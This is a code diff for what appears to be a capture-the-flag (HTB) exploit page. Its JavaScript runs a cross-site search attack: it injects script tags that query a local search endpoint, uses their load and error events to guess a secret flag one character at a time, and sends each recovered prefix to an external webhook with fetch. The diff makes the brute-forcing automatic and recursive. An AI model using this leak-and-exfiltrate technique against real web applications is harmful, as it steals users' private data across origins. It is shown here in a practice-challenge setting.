@@ -5,16 +5,15 @@
     var url = "http://127.0.0.1:1338/api/entries/search?q=";
     var htb = 'HTB';
     var letters = '';
-        
+    var FLAG = 'HTB';
     // flag characters
     for(var i=33; i<127; i++){
         letters += String.fromCharCode(i);
     }
         
     async function makeFetchRequest() {
-
         for(var i=0; i<letters.length; i++){
-            await doGuess(letters[i]);//await doGuess(htb + letters[i]);
+            await doGuess(FLAG+letters[i]);
         }
     }
 
@@ -22,39 +21,15 @@
     async function doGuess(g){
         const script = document.createElement("script");
         script.src = url+g;
-        script.onload = () => {fetch(whook+g+'SUCCESS')};
+        script.onload = () => {
+            FLAG += g;
+            fetch(whook+FLAG);
+            makeFetchRequest();
+        };
         script.onerror = () => {fetch(whook+g+'Fail')};
         document.head.appendChild(script);
-//         console.log('attempting '+url+g);
-//         await fetch(url+g)
-//         .then(function(response) {
-//         if (!response.ok) {
-//             fetch(whook+g+'failed');
-//             throw Error(response.statusText);
-//         }
-//         return response;
-//     }).then(function(response) {
-//         fetch(whook+g+'OK');
-//         console.log("ok");
-//     }).catch(function(error) {
-//         fetch(whook+g+'failed2');
-//         console.log(error);
-//     });
-        
-        //.then(response => {
-            //if(response.ok){
-                //fetch(whook+'SUCCESS')
-          //      fetch(whook+String(response.status));
-                
-           // }
-       //  })
-        //.catch(error => {fetch(whook+g+'failed')})
     }
-    //makeFetchRequest();
-    doGuess('H');
-    doGuess('HT');
-    doGuess('HELLOWORLD');
-  //  doGuess('HTB{');
-   // console.log("newest");
+    makeFetchRequest();
+
     </script>
 </body>
